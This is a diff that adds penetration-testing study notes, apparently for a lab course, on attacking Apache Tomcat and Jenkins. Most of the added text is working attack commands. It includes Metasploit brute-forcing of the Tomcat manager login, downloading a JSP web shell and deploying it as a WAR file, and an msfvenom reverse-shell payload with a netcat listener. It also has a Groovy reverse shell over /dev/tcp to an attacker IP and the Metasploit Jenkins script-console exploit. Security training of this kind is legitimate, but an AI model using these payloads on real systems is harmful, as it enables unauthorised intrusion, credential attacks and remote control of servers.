@@ -450,7 +450,7 @@ webapps/customapp
     └── classes                     # Classes might contain important business logic as well as sensitive information
         └── AdminServlet.class   
 ``` 
-- Example web.xml file:
+- Example web.xml file (important to check to leverage LFI):
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 
@@ -467,4 +467,98 @@ webapps/customapp
     <url-pattern>/admin</url-pattern>
   </servlet-mapping>
 </web-app> 
+```
+- ``` tomcat-users.xml``` has valuable user information
+
+### Enumeration
+
+- Attempt to locate the /manager and /host-manager pages:
+```bash
+gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
+```
+- Try to log in with weak creds (tomcat:tomcat, admin:admin) or bruteforce
+
+### Attacking Tomcat
+
+#### Tomcat Manager - Login Brute Force
+
+- Try bruteforcing the Tomcat manager page using Metasploit:
+```bash
+msfconsole
+use auxiliary/scanner/http/tomcat_mgr_login
+set VHOST web01.inlanefreight.local
+set RPORT 8180
+set stop_on_success true
+set rhosts 10.129.128.204 
+show options 
+run
+```
+
+#### Tomcat Manager - WAR File Upload
+
+- Available at /manager/html by default
+- Users assigned the manager-gui role are allowed to access
+- Login to manager page (```http://web01.inlanefreight.local:8180/manager/html```) once valid credentials obtained
+- Download JSP web shell and zip it as a .war file
+```bash
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp 
+```
+- In the GUI click on ```Browse``` to select the .war file and then click on ```Deploy```
+- Once uploaded the ```/backup``` application should appear in the applications table
+- Confirm webshell execution ```curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id```
+- Undeploy backups application once done
+
+- Can also create a reverse shell using msfvenom
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.251 LPORT=4443 -f war > backup.war
+```
+- Start a Netcat listener and click on /backup to execute the shell.
+```bash
+nc -lnvp 4443
+```
+- Metaploit module ```multi/http/tomcat_mgr_upload``` can automate this process
+
+## [Jenkins](https://www.jenkins.io/)
+
+### Discovery & Enumeration
+
+- 0pen-source automation server written in Java that helps developers build and test their software projects continuously
+- Default runs on port 8080 with slaves on 5000
+- Default login page reveals we are dealing with Jenkins
+- Default credentials admin:admin
+
+### Attacking Jenkins
+
+#### Script Console
+
+- Run arbitrary Groovy scripts within the Jenkins controller runtime
+- Found at ```http://jenkins.inlanefreight.local:8000/script```
+
+**Linux Hosts**
+- Example groovy script:
+```groovy
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+```
+- Reverse shell script
+```groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+- Can use metasploit to get reverse shell:
+```bash
+use exploit/multi/http/jenkins_script_console
+set TARGET < target-id >
+exploit
+```
+- Start listener and upgrade to interactive shell:
+```bash
+nc -lvnp 8443
+/bin/bash -i
 ```
